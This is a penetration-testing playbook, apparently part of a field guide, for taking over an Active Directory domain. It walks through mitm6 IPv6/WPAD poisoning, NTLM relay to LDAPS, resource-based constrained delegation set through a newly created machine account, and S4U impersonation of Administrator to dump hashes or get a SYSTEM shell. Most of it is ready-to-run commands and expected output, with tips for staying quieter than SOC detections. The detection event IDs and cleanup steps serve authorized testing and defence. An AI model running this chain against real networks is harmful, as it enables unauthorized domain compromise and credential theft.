---
tags:
  - hack-notes
  - playbook
  - ad
  - relay
---

# IPv6 mitm6 Relay to RBCD Takeover Playbook

> Abuse default IPv6 (WPAD/DHCPv6) with mitm6 to become the network's DNS, relay captured NTLM auth to LDAPS, configure RBCD on a target computer with an attacker-controlled machine account, then S4U2Self/S4U2Proxy to a Domain Admin context and shell/dump the target.

> **Attack graph position**
> **Fed by:** Internal network position (entry); [Edge Device Exploit to Internal Foothold](Edge%20Device%20Exploit%20to%20Internal%20Foothold.md), [SQL Injection to RCE to Pivot](SQL%20Injection%20to%20RCE%20to%20Pivot.md).
> **Feeds into:** [Coercion to ADCS ESC8 to Domain Admin](Coercion%20to%20ADCS%20ESC8%20to%20Domain%20Admin.md) (if LDAP signing is enforced); [DCSync to Golden Ticket Persistence](DCSync%20to%20Golden%20Ticket%20Persistence.md)
> Full chain map: [Attack Graph](Attack%20Graph.md)

## Scenario at a Glance

| | |
|---|---|
| Goal | Compromise a specific domain-joined host (and from it the domain) without any valid creds at the start |
| Starting position | Foothold on the LAN/VLAN with the target hosts. No domain creds required. A low-priv domain user helps but is not mandatory. |
| End state | SYSTEM/Domain Admin context on the target via an impersonation ticket, then secretsdump / shell. Often a stepping stone to Tier-0. |
| Key techniques | T1557.003 (LLMNR/NBT-NS/IPv6 poisoning), T1187 (forced auth), T1550.003 (Kerberos S4U), T1098 (account manipulation, RBCD) |
| Prerequisites | IPv6 enabled (default on Windows), WPAD/DHCPv6 not hardened, LDAP/LDAPS reachable, LDAP signing+channel binding NOT both enforced, MachineAccountQuota > 0 (default 10) |
| Difficulty | Medium |
| Noise level | Loud. Rogue DHCPv6/DNS, a new computer account (4741), and anomalous 4769/S4U traffic all fire. |

## Attack Path

```
  mitm6 -d corp.local
     |  (DHCPv6 -> attacker is DNS; WPAD -> proxy auth)
     v
  Victim authenticates (machine + user NTLM) to attacker
     |
     v
  ntlmrelayx.py -6 -t ldaps://DC --delegate-access --add-computer
     |
     +-- LDAP signing + channel binding ENFORCED? ---> YES: LDAPS relay fails
     |                                                      -> pivot to [[Coercion to ADCS ESC8 to Domain Admin]]
     |                                                         (HTTP enrollment can never sign)
     |
     +-- MachineAccountQuota == 0? --------------------> YES: reuse an OWNED computer acct
     |                                                         (--escalate-user / set RBCD manually)
     |
     v  (relay succeeds: SHARKPC$ created, RBCD written on TARGET)
  msDS-AllowedToActOnBehalfOfOtherIdentity on TARGET$ = SHARKPC$
     |
     v
  getST -spn cifs/target -impersonate Administrator  (S4U2Self + S4U2Proxy)
     |
     v
  KRB5CCNAME=Administrator.ccache
     |
     v
  secretsdump.py -k -no-pass TARGET   /   psexec.py -k -no-pass TARGET   ==> shell / hashes
```

## Prerequisites and Setup

- Linux attack box on the same broadcast domain / VLAN as the victims (mitm6 is link-local DHCPv6, it does not route).
- Dual-stack tolerance: Windows prefers IPv6 over IPv4, so once you answer DHCPv6 you win name resolution. No need to disable IPv4.
- Tooling (current 2024-2026 builds):
  - `mitm6` (fox-it/mitm6) installed via `pipx install mitm6` or distro package.
  - Impacket from `fortra/impacket` (use the `impacket-*` wrappers on Kali or `python3 examples/*.py`). Versions 0.11+ ship the `-6`, `--delegate-access`, `--add-computer`, and `--no-dump` flags used here.
  - `netexec` (nxc, the maintained successor to CrackMapExec) for account creation and verification.
  - Optional Windows side: `Rubeus` for S4U if you prefer to operate from a Windows beacon.
- Know the values: `corp.local` (FQDN), DC FQDN `DC01.corp.local`, the relay target host (e.g. `TARGET.corp.local`), and which user you want to impersonate (usually `Administrator` or a known DA).
- Decide the LDAP scheme up front: prefer `ldaps://` (LDAP over TLS, port 636). LDAPS sidesteps LDAP *signing* but is still defeated by *channel binding* (EPA). See the decision branch in Step 3.

## Walkthrough

### Step 1. Stand up mitm6 as rogue DHCPv6 + DNS

What and why: Windows hosts periodically send DHCPv6 solicits and (still) try WPAD. mitm6 replies, hands the victim an IPv6 address with the attacker as primary DNS, and answers WPAD lookups. That makes you the man in the middle for name resolution, which forces auth to you in Step 2.

```bash
# -d limits poisoning to the target domain so you do not nuke the whole LAN
# --ignore-nofqdn and -i <iface> as needed; -hw/-hb host whitelist/blacklist to scope
sudo mitm6 -d corp.local -i eth0
```

Tighter scoping (recommended, less noise, fewer accidental clients):

```bash
sudo mitm6 -d corp.local --host-allowlist TARGET.corp.local --host-allowlist VICTIM01.corp.local -i eth0
```

Success signal: console shows `IPv6 address ... is now assigned to <victim-mac>` and `Sending spoofed reply for wpad.corp.local.` / `Sending spoofed reply for <host>.corp.local.` lines as victims renew.

Note: mitm6 self-expires its leases after a few minutes by design (it sets short lifetimes to avoid bricking the network). Leave it running; it re-poisons on renewal.

### Step 2. Park ntlmrelayx on the relay, targeting LDAPS

What and why: When the poisoned victim resolves WPAD (or any name) to you and authenticates, ntlmrelayx forwards that NTLM auth to the DC over LDAPS and, with `--delegate-access`, writes RBCD. `--add-computer` mints a fresh machine account (using MachineAccountQuota) to be the RBCD principal so you control its password.

```bash
# -6 listen on IPv6 too; -t ldaps:// avoids LDAP signing (TLS-wrapped);
# -wh serves the WPAD file; --add-computer creates SHARKPC$ with a known pw;
# --delegate-access writes msDS-AllowedToActOnBehalfOfOtherIdentity on the relayed machine's computer object
sudo ntlmrelayx.py -6 -t ldaps://DC01.corp.local -wh wpad.corp.local \
  --add-computer 'SHARKPC$' --delegate-access -smb2support
```

If you want to pin the new account's password (cleaner for the S4U step):

```bash
sudo ntlmrelayx.py -6 -t ldaps://DC01.corp.local -wh wpad.corp.local \
  --add-computer 'SHARKPC$' --delegate-access -smb2support
# ntlmrelayx prints the generated password; copy it. Or pre-create in Step 4 and skip --add-computer.
```

Success signal: ntlmrelayx logs
```
[*] Authenticating against ldaps://DC01.corp.local as CORP/VICTIM01$ SUCCEED
[*] Adding new computer with username: SHARKPC$ and password: <pw> result: OK
[*] Delegation rights modified successfully!
[*] SHARKPC$ can now impersonate users on VICTIM01$ via S4U2Proxy
```

Note on *which* object gets RBCD: `--delegate-access` writes the allow-list on the **computer object that authenticated** (the relayed machine). So to take over a *specific* TARGET, you must coerce/poison **TARGET's machine account** (reboot, or trigger it). If you only catch a user account, relay that to LDAP to grant yourself other rights instead (see Variations).

### Step 3. Decision branch: did the LDAPS relay land?

What and why: This is where modern AD hardening forks the path. Read the ntlmrelayx output.

- If you see `SUCCEED` + `Delegation rights modified successfully!` go to Step 4.
- If you see `LDAP signing is enforced` or the bind fails on channel binding / `STATUS_AUTHENTICATION_FIREWALL_FAILED` style errors, the relay is dead on LDAP. **Pivot to ESC8.**

Current hardening reality (2024-2026):
- **LDAP signing** alone does not stop LDAPS relay, because LDAPS is TLS and the signing requirement is satisfied differently. Plain `ldap://` (389) relay *is* killed by signing.
- **LDAP channel binding (EPA / `LdapEnforceChannelBinding=2`)** *does* kill LDAPS relay, because the TLS channel binding token will not match. Values: `0` disabled, `1` when-supported, `2` always-required.
- **Windows Server 2025**: new-forest DCs ship LDAP **signing** required by default (the new "LDAP server signing requirements Enforcement" policy resolves to Require Signing). Channel binding default is still **"When supported,"** so the `LdapEnforceChannelBinding` registry value does not exist until set. Net: LDAPS relay often still works on 2025 unless an admin explicitly enforced channel binding. Upgraded (not fresh) DCs keep their old, usually weaker, settings.
- Confirm posture from the box before relying on it:

```bash
# Does the DC require/accept channel binding? (nxc ldap signing/channel-binding check)
nxc ldap DC01.corp.local -u '' -p '' -M ldap-checker
```

Decision: **LDAP path closed (channel binding enforced)** -> jump to [Coercion to ADCS ESC8 to Domain Admin](Coercion%20to%20ADCS%20ESC8%20to%20Domain%20Admin.md). HTTP web enrollment cannot sign or channel-bind NTLM, so relay `-t http://CA01.corp.local/certsrv/certfnsh.asp` with `--adcs --template <Machine/User>` instead, and use the issued cert with PKINIT. Same coercion front end (mitm6 or a coercer), different relay target.

### Step 4. (If needed) Create or reuse the RBCD principal account

What and why: `--add-computer` in Step 2 already created SHARKPC$ and you know its password. Do this step manually only if you want a controlled account, are reusing one, or MachineAccountQuota is in play.

Create a machine account with nxc (uses default MAQ of 10, any domain user can do this):

```bash
nxc ldap DC01.corp.local -u lowprivuser -p 'Passw0rd!' \
  -M add-computer -o NAME='SHARKPC$' PASSWORD='Sh4rkP4ss!'
```

Or with Impacket directly:

```bash
addcomputer.py -computer-name 'SHARKPC$' -computer-pass 'Sh4rkP4ss!' \
  -dc-host DC01.corp.local corp.local/lowprivuser:'Passw0rd!'
```

**Decision: MachineAccountQuota == 0.** A common hardening. Then you cannot mint a new account. Options:
- Reuse a computer account you already own (you have its password or NT hash). Set it as the RBCD principal instead of SHARKPC$.
- Use a different LDAP write primitive: if the relayed identity can write `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target, point it at an existing controlled SID. ntlmrelayx `--delegate-access` still works with `--escalate-user <ownedaccount>` style flows.
- If you control no usable account at all, fall back to the ESC8 path (Step 3 decision), which needs no RBCD principal.

Verify the RBCD allow-list was written on the target object:

```bash
nxc ldap DC01.corp.local -u 'SHARKPC$' -p 'Sh4rkP4ss!' \
  --delegate TARGET --M whoami 2>/dev/null
# or read it directly:
python3 examples/rbcd.py -delegate-from 'SHARKPC$' -delegate-to 'TARGET$' \
  -dc-ip 10.10.10.10 -action read corp.local/lowprivuser:'Passw0rd!'
```

Success signal: rbcd.py read shows `SHARKPC$` listed under "Accounts allowed to act on behalf of other identity" for `TARGET$`.

### Step 5. S4U2Self + S4U2Proxy: forge a ticket as a Domain Admin to the target

What and why: RBCD lets SHARKPC$ ask the KDC for a ticket to TARGET on behalf of any user, including a Domain Admin, even though that user never logged in. getST runs S4U2Self (get a ticket to ourselves as the impersonated user) then S4U2Proxy (forward it to cifs/TARGET).

```bash
# -spn the service you want on the target; cifs gives file + remote exec.
# -impersonate the privileged principal you want to become.
getST.py -spn 'cifs/TARGET.corp.local' -impersonate Administrator \
  -dc-ip 10.10.10.10 'corp.local/SHARKPC$:Sh4rkP4ss!'
```

Success signal: `Saving ticket in Administrator@cifs_TARGET.corp.local@CORP.LOCAL.ccache`.

Windows-side equivalent (operating from a beacon, Rubeus):

```powershell
Rubeus.exe s4u /user:SHARKPC$ /rc4:<NT-hash-of-SHARKPC$> /impersonateuser:Administrator `
  /msdsspn:cifs/TARGET.corp.local /dc:DC01.corp.local /ptt
```

Tip: if you need more than CIFS later (e.g. HOST, HTTP, LDAP), getST supports `-altservice` to mint additional SPNs from one S4U exchange:

```bash
getST.py -spn 'cifs/TARGET.corp.local' -altservice 'host/TARGET.corp.local,http/TARGET.corp.local' \
  -impersonate Administrator -dc-ip 10.10.10.10 'corp.local/SHARKPC$:Sh4rkP4ss!'
```

### Step 6. Use the ticket: dump secrets or get a shell

What and why: Load the ccache into KRB5CCNAME and hit the target with Kerberos auth (`-k -no-pass`). secretsdump pulls SAM + LSA + (if it is a DC) NTDS; psexec/wmiexec gives an interactive SYSTEM shell.

```bash
export KRB5CCNAME=$(pwd)/Administrator@cifs_TARGET.corp.local@CORP.LOCAL.ccache

# Dump local secrets (SAM/LSA) as Administrator on the target
secretsdump.py -k -no-pass TARGET.corp.local

# Or a shell
psexec.py -k -no-pass TARGET.corp.local        # SYSTEM shell via service
wmiexec.py -k -no-pass TARGET.corp.local        # quieter, no service install
```

Success signal: secretsdump prints `[*] Dumping local SAM hashes` and the Administrator NTLM hash; psexec drops you to `C:\Windows\system32>` as `nt authority\system`.

Decision: if TARGET is a DC, secretsdump `-k -no-pass -just-dc` performs DCSync and you own the domain. If TARGET is a member server, use the dumped local admin hash for lateral movement or escalate from there (collected creds, Tier-0 reuse).

## OPSEC and Detection

What the SOC sees, and how to be quieter:

- **Rogue DHCPv6 / DNS**: mitm6 emits DHCPv6 Advertise/Reply from a non-authorized server. Network NAC, DHCP guard, and IPv6 RA Guard catch this fast. Scope with `--host-allowlist` and `-d` so you only answer for your targets, and run it only as long as you need a single capture.
- **WPAD over IPv6**: queries for `wpad.<domain>` answered by a non-DNS host. Many shops alarm on WPAD entirely.
- **Computer account creation (Event ID 4741)** on the DC the instant `--add-computer` fires. Name like `SHARKPC$` with no description, created by a user (not a DC), is a giant flag. The account's `ms-DS-CreatorSID` points straight at the creating user.
- **LDAP write to `msDS-AllowedToActOnBehalfOfOtherIdentity`**: directory-change auditing (Event ID 5136) on the target computer object is the single highest-fidelity detection for RBCD abuse. Tools like the BloodHound RBCD edge and dedicated RBCD monitoring key on exactly this attribute changing.
- **Kerberos S4U anomalies**: a burst of **4769** (service ticket requested) for `cifs/TARGET` impersonating `Administrator`, sourced from a brand-new computer account, with the S4U2Proxy "transited services" field populated. **4624** logon Type 3 on TARGET as Administrator from an unusual host follows.
- **psexec** installs a service (Event ID 7045 / 4697) and is loud. Prefer `wmiexec.py` for the shell, or just secretsdump if creds are the goal.
- Reduce noise overall: pre-create the RBCD account once during low-activity hours, target a single host, tear down mitm6 between captures, and prefer the quietest exec method that meets the objective.

## Cleanup

Revert artifacts in reverse order of creation:

1. **Delete the created computer account** (removes the 4741 artifact and the RBCD principal):
   ```bash
   nxc ldap DC01.corp.local -u lowprivuser -p 'Passw0rd!' -M del-computer -o NAME='SHARKPC$'
   # or
   addcomputer.py -computer-name 'SHARKPC$' -delete -dc-host DC01.corp.local \
     corp.local/lowprivuser:'Passw0rd!'
   ```
2. **Clear `msDS-AllowedToActOnBehalfOfOtherIdentity` on the target** so no stale delegation remains:
   ```bash
   python3 examples/rbcd.py -delegate-to 'TARGET$' -dc-ip 10.10.10.10 \
     -action flush corp.local/lowprivuser:'Passw0rd!'
   ```
   (`-action flush` removes the whole allow-list; use `-action remove -delegate-from 'SHARKPC$'` to drop only your principal.)
3. **Destroy local ccache/ticket files**: `kdestroy` and remove the `*.ccache` files you wrote (`Administrator@cifs_TARGET...ccache`). Unset `KRB5CCNAME`.
4. **Stop mitm6** and let leases expire; remove any WPAD file artifacts. If you installed a psexec service, confirm it uninstalled (Impacket removes it on clean exit; verify Event 7045/service is gone).
5. Note in the report the window mitm6 was poisoning, since it briefly affected name resolution for in-scope hosts.

## Troubleshooting

- **`LDAP signing is enforced` on relay**: you targeted `ldap://` (389). Switch to `ldaps://` (636). Signing does not protect LDAPS.
- **LDAPS bind fails on channel binding / firewall failure**: EPA / `LdapEnforceChannelBinding=2` is on. LDAPS relay is dead. Pivot to ESC8 (HTTP enrollment cannot channel-bind). This is the most common 2025+ wall.
- **`Could not add computer ... CONSTRAINT_ATT_TYPE` / quota exceeded**: MachineAccountQuota is 0 or you hit the per-user cap of 10. Reuse an owned computer account as the RBCD principal (Step 4 decision).
- **Relayed a USER not a MACHINE, RBCD write lands on the wrong object**: `--delegate-access` writes on whatever authenticated. To take a specific TARGET you must capture TARGET's *machine* account (force a reboot, coerce it, or wait for renewal). User auth is better spent on other LDAP writes (add to a group, grant DCSync).
- **getST returns `KDC_ERR_BADOPTION` / `KDC_ERR_S_PRINCIPAL_UNKNOWN` on S4U2Proxy**: the SPN must exist and the impersonated user must not be `sensitive / cannot be delegated` and not in Protected Users. Pick a different DA, or confirm RBCD actually wrote (read it with rbcd.py).
- **S4U2Self ok but S4U2Proxy denied**: RBCD attribute did not commit, or replication lag. Re-read the allow-list; wait for AD replication if the DC you wrote to differs from the one issuing tickets (`-dc-ip` the same DC throughout).
- **Dual-stack timing / victim never poisons**: Windows only re-solicits DHCPv6 on renewal or network change. Force it by waiting for a reboot, triggering a logon, or coercing the host (PetitPotam/Coercer) so it authenticates to you directly without needing WPAD at all.
- **`secretsdump -k -no-pass` says clock skew**: Kerberos needs time sync. `sudo ntpdate DC01.corp.local` or `faketime` the host to within 5 minutes of the DC.
- **CVE-2025-33073 relevance**: the June 2025 NTLM reflection fix changes how coerced SMB auth behaves and the broader push (SMB signing, the "NTLM is dead" messaging) tightens the coercion front end. The mitm6 -> LDAPS -> RBCD chain itself is unaffected by that patch (it is an LDAP-side technique, not SMB reflection), but if you are *coercing* over SMB to feed the relay, patched hosts may resist. Use WPAD/DHCPv6 poisoning (this playbook's front end) or an unpatched coercion vector.

## Variations and Pivots

- **LDAP channel binding enforced -> ESC8**: keep the same mitm6 front end, change ntlmrelayx target to the ADCS web enrollment endpoint (`-t http://CA01.corp.local/certsrv/certfnsh.asp --adcs --template Machine`). HTTP cannot sign or channel-bind. See [Coercion to ADCS ESC8 to Domain Admin](Coercion%20to%20ADCS%20ESC8%20to%20Domain%20Admin.md).
- **No RBCD write but LDAP relay works**: use the relay for other writes instead. `--escalate-user <ownedaccount>` to grant yourself rights, or dump the domain with `ntlmrelayx --dump-laps` / Shadow Credentials (`msDS-KeyCredentialLink`) for a cleaner, quota-free takeover of a single object.
- **Shadow Credentials instead of RBCD**: if you can write `msDS-KeyCredentialLink` on the target (pyWhisker / `ntlmrelayx --shadow-credentials`), you skip the machine account entirely and PKINIT directly as the target. Often quieter than 4741 + RBCD.
- **Operate fully from Windows**: replace mitm6/ntlmrelayx with `Inveigh` (poisoning) and `Rubeus` (S4U), useful when you only have a Windows beacon and cannot drop a Linux box on the wire.
- **Escalate from member-server SYSTEM to DA**: once you own TARGET, harvest cached creds/tickets, hunt for Tier-0 sessions, or DCSync if TARGET was a DC. Continue in [Active Directory and Kerberos](../Cheatsheets/Active%20Directory%20and%20Kerberos.md).
- **Coercion replaces poisoning**: if you cannot wait for DHCPv6 renewal, coerce the machine account directly (PetitPotam, Coercer, DFSCoerce) so it authenticates to ntlmrelayx on demand, then proceed identically from Step 2.

## Related

- [Internal Network and Active Directory](../Checklists/Internal%20Network%20and%20Active%20Directory.md)
- [Active Directory and Kerberos](../Cheatsheets/Active%20Directory%20and%20Kerberos.md)
- [NetExec and Impacket](../Cheatsheets/NetExec%20and%20Impacket.md)
- [Coercion to ADCS ESC8 to Domain Admin](Coercion%20to%20ADCS%20ESC8%20to%20Domain%20Admin.md)
- Ariadne

---
*Part of the [Pentest Field Guide](https://github.com/Su1ph3r/hack-notes-field-guide), maintained by [Cairn Security](https://cairnsecurity.com). Independent penetration testing.*
